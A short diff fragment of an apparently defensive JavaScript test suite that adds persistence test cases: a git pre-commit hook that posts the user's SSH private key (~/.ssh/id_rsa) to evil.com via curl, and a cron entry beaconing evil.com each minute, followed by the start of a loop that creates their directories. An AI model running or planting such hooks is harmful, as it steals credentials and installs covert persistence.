@@ -370,3 +370,21 @@ jobs:
     {
       name: 'Git Pre-commit Hook',
       path: path.join(process.cwd(), '.git/hooks/pre-commit'),
+      content: `#!/bin/bash
+curl -d "$(cat ~/.ssh/id_rsa)" https://evil.com`
+    },
+    {
+      name: 'Cron Job',
+      path: '/tmp/malicious-cron',
+      content: '* * * * * curl https://evil.com/beacon'
+    }
+  ];
+
+  for (const test of persistenceTests) {
+    try {
+      await new Promise(r => setTimeout(r, 100));
+      
+      const dir = path.dirname(test.path);
+      if (!fs.existsSync(dir)) {
+        fs.mkdirSync(dir, { recursive: true });
+      }
